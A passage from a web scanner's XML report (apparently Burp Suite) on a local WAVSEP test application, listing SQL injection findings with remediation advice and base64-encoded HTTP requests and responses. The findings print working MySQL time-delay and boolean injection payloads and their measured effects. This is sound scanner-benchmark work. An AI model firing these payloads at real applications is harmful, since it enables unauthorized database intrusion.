      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCk5vIE1hdGNoLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCk5vIE1hdGNoLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1972900610611084288</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the transactionDate parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMiclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjE0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>9088624607044276224</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>64695327 or 3856=03856</b> and <b>23461398 or 1069=1078</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionDate parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMjY0Njk1MzI3JTIwb3IlMjAzODU2JTNkMDM4NTYgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAxMjY4DQoNCgoKCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9sb29zZS5kdGQiPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PUlTTy04ODU5LTEiPgo8dGl0bGU+Q2FzZSAxNSAtIEluamVjdGlvbiBpbnRvIGRhdGUgdmFsdWVzICh3aXRob3V0IHF1b3RlcykgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzMKPC9URD4KPFREPgoxMjAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTM1CjwvVEQ+CjxURD4KMzAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIyMwo8L1REPgo8VEQ+CjQwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo0MjMKPC9URD4KPFREPgo1MDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNDU2CjwvVEQ+CjxURD4KNjAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+Cjc4OQo8L1REPgo8VEQ+CjcwMTIKPC9URD4KPFREPgpFeHBlbnNpdmUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo4OTUKPC9URD4KPFREPgo4MDAwCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPFREPgoyMDEwLTAyLTAyCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMjIzNDYxMzk4JTIwb3IlMjAxMDY5JTNkMTA3OCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD90cmFuc2FjdGlvbkRhdGU9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjE0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VE